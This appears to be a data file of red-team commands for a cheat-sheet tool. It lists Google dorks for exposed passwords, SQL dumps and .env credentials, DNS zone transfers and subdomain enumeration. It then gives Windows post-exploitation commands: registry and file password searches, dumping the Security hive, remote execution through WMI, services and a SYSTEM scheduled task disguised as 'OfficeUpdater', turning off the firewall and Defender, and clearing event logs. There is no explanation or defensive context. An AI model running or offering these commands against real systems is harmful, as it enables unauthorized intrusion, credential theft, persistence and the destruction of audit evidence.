red|OSINT - Google: site search|site:<URL>
red|OSINT - Google: filetype|filetype:pdf site:<DOMAIN>
red|OSINT - Google: find passwords|filetype:txt "username" "password"
red|OSINT - Google: index listings|intitle:"index of" site:<DOMAIN>
red|OSINT - Google: SQL dumps|filetype:sql "INSERT INTO"
red|OSINT - Google: config files|ext:env "DB_PASSWORD"
red|OSINT - Shodan|shodan.io
red|OSINT - theHarvester|theHarvester -d <DOMAIN> -b all -l 500
red|OSINT - Recon-ng Framework|recon-ng
red|OSINT - Maltego|maltego.com
red|OSINT - Certificate Transparency|curl -s "https://crt.sh/?q=<DOMAIN>&output=json" | jq .
red|OSINT - Subdomain Enum (amass)|amass enum -d <DOMAIN>
red|OSINT - Subdomain Enum (subfinder)|subfinder -d <DOMAIN>
red|OSINT - Email Harvest|theHarvester -d <DOMAIN> -b google,linkedin
red|OSINT - WHOIS|whois <DOMAIN>
red|OSINT - DNS Any|dig <DOMAIN> ANY
red|OSINT - DNS Zone Transfer|dig axfr <DOMAIN> @<NS_IP>
red|OSINT - Reverse DNS|dig -x <IP>
red|OSINT - DNS Brute Force|dnsrecon -d <DOMAIN> -t brt -D subdomains.txt
red|Windows - OS Version|ver && systeminfo
red|Windows - Hotfixes|wmic qfe list
red|Windows - CPU Arch|wmic cpu get datawidth /format:list
red|Windows - Situational Awareness|systeminfo
red|Windows - Net Shares|net share
red|Windows - Net Sessions|net session
red|Windows - Process List|tasklist /svc
red|Windows - Kill Process|taskkill /F /IM <PROCESS_NAME> /T
red|Windows - Process Paths|wmic process get name,executablepath,processid
red|Windows - Network Config|ipconfig /all
red|Windows - DNS Cache|ipconfig /displaydns
red|Windows - All Connections+PID|netstat -ano
red|Windows - Netstat to File|netstat -anop tcp 3 >> <FILE>
red|Windows - Routing Table|route print
red|Windows - ARP Table|arp -a
red|Windows - DNS Zone Transfer|nslookup; server <FQDN>; set type=ANY; ls -d <DOMAIN>
red|Windows - Registry Password Search|reg query HKLM /f password /t REG_SZ /s
red|Windows - Save Security Hive|reg save HKLM\Security security.hive
red|Windows - Last Registry Key|HKCU\Software\Microsoft\Windows\CurrentVersion\Applets\Regedit /v LastKey
red|Windows - Typed URLs|HKCU\Software\Microsoft\Internet Explorer\TypedURLs
red|Windows - PuTTY Sessions|HKCU\Software\SimonTatham\Putty\Sessions
red|Windows - Remote Process List|tasklist /v /s <IP>
red|Windows - Remote WMI Exec|wmic /node:<IP> /user:<DOMAIN>\<USER> /password:<PASS> process call create "<CMD>"
red|Windows - File Search PDF|dir /a /s /b C:\*pdf*
red|Windows - Findstr Password|findstr /SI password *.txt *.xml *.ini *.config
red|Windows - File Type Display|type <FILE>
red|Windows - Count Lines|type <FILE> | find /c /v ""
red|Windows - Tree to File|tree.com /F /A > tree.log
red|Windows - VSS List|vssadmin list shadows
red|Windows - VSS Create|wmic shadowcopy call create Volume=c:\
red|Windows - VSS Link|mklink /D C:\restore \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
red|Windows - Remote SC Execution|sc \\<IP> config vss binpath= "<FILE>" && sc \\<IP> start vss
red|Windows - Remote Schtask|schtasks /Create /F /RU system /SC ONLOGON /TN OfficeUpdater /TR <FILE> /s <IP>
red|Windows - AD Domain Admins|net localgroup administrators /domain
red|Windows - AD All Users|net user /domain
red|Windows - AD User Info|net user <USERNAME> /domain
red|Windows - AD Account Policy|net accounts /domain
red|Windows - DSQUERY Admin Users|dsquery * -filter "(&(objectclass=user)(admincount=1))" -attr samaccountname name
red|Windows - DSQUERY Domain Trusts|dsquery * -filter "(objectclass=trusteddomain)" -attr flatname trustdirection
red|Windows - Port Forward (netsh)|netsh interface portproxy add v4tov4 listenport=3000 listenaddress=1.1.1.1 connectport=4000 connectaddress=2.2.2.2
red|Windows - Disable Firewall|netsh advfirewall set allprofiles state off
red|Windows - Disable Defender (SC)|sc config WinDefend start= disabled && sc stop WinDefend
red|Windows - Disable Defender (PS)|Set-MpPreference -DisableRealtimeMonitoring $true
red|Windows - Clear Event Logs|wevtutil cl Application && wevtutil cl Security
red|Windows - Backup Event Log|wevtutil cl Application /bu:<FILE>.evtx
